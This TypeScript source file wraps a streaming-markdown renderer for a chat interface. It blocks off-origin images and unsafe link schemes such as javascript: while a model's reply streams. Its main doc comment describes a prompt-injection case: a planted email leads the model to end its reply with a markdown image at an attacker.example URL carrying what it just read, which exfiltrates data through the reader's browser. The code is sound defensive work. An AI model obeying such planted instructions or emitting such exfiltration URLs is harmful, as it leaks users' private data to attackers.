import * as smd from 'streaming-markdown';

import { isOwnOriginImage, isSiteRelativePath } from '@/components/Markdown';

/**
 * An http(s) URL to link a refused image to, or null for anything else — a
 * `javascript:` source must not become a clickable anchor on the way to being
 * made safe.
 */
function linkableUrl(value: string): string | null {
  try {
    const url = new URL(value, window.location.origin);

    return url.protocol === 'http:' || url.protocol === 'https:' ? url.href : null;
  } catch {
    return null;
  }
}

/**
 * Where a streamed link may point: a path on this site, an http(s) URL or a
 * `mailto:`, or nowhere. `null` for anything else, `javascript:` first among
 * them, and also `data:`, `intent:` and app schemes such as `companion://`.
 *
 * The same allowance `Markdown` gets from react-markdown's URL transform for a
 * stored message, minus the chat-protocol schemes nothing here links to.
 */
function linkTarget(value: string): { href: string; offOrigin: boolean } | null {
  if (isSiteRelativePath(value)) {
    return { href: value.replace(/[\t\n\r]/g, ''), offOrigin: false };
  }

  try {
    // No base: a value that is not already absolute is refused, not resolved.
    const url = new URL(value);

    if (url.protocol === 'mailto:') {
      return { href: url.href, offOrigin: false };
    }

    if (url.protocol === 'http:' || url.protocol === 'https:') {
      return { href: url.href, offOrigin: url.origin !== window.location.origin };
    }
  } catch {
    // Not a URL at all.
  }

  return null;
}

/**
 * `streaming-markdown`'s DOM renderer, holding images to {@link isOwnOriginImage}
 * and links to {@link linkTarget}.
 *
 * The live reply is not rendered by `Markdown`: while a turn streams, `Chat`
 * writes every TEXT and THINK frame straight into the DOM through this
 * renderer, and only a reloaded message goes through `Markdown` and its
 * `MarkdownImage`. The stock renderer opens an `<img>` at `![` and sets `src`
 * to whatever the model wrote the moment the `)` arrives — so a model steered
 * by a planted email into ending its reply with
 * `![](https://attacker.example/log?d=<what it just read>)` had the reader's
 * browser send that query string off as the reply painted, whatever the stored
 * copy rendered as later. The gateway CSP allows `img-src *`, so nothing
 * downstream stops it.
 *
 * `set_attr` is the only place a URL reaches the element, and the `<img>` has
 * no `src` — so fetches nothing — until then. That is the hook wrapped:
 * an own-origin source is set as before, and anything else replaces the
 * still-empty `<img>` with the link `MarkdownImage` renders (the alt text, or
 * the URL, opening in a new tab with no referrer). Nothing is fetched.
 *
 * Links take the same route. The stock renderer hands the `[text](target)`
 * target, and a bare http(s) URL, straight to `setAttribute('href', …)`. React
 * never sees this DOM, so neither its `javascript:` guard nor react-markdown's
 * URL transform applies, and a streamed `javascript:` link stayed clickable
 * until the thread reloaded. On the phone apps, which load the bundle with no
 * CSP, tapping it ran script with the app's plugins in reach. A refused target
 * leaves the anchor without an `href`, so it reads as plain text.
 */
export function streamingMarkdownRenderer(root: HTMLElement): smd.Default_Renderer {
  const renderer = smd.default_renderer(root);

  return {
    ...renderer,
    set_attr(data, type, value) {
      if (type === smd.Attr.Href) {
        const anchor = data.nodes[data.index];
        const target = linkTarget(value);

        if (target) {
          anchor.setAttribute('href', target.href);

          if (target.offOrigin) {
            anchor.setAttribute('target', '_blank');
            anchor.setAttribute('rel', 'noopener noreferrer');
          }
        }

        return;
      }

      if (type !== smd.Attr.Src) {
        smd.default_set_attr(data, type, value);

        return;
      }

      const image = data.nodes[data.index];
      // The stock renderer appends the alt text to the open token, which for
      // an image is the <img> itself — where nothing ever displays it.
      const alt = image.textContent ?? '';

      if (isOwnOriginImage(value)) {
        image.textContent = '';
        image.setAttribute('alt', alt);
        image.setAttribute('src', value);

        return;
      }

      const link = document.createElement('a');
      const href = linkableUrl(value);

      if (href) {
        link.href = href;
      }

      link.rel = 'noopener noreferrer';
      link.target = '_blank';
      link.dataset.remoteImage = '';
      link.textContent = alt || value;

      image.replaceWith(link);
      data.nodes[data.index] = link;
    },
  };
}
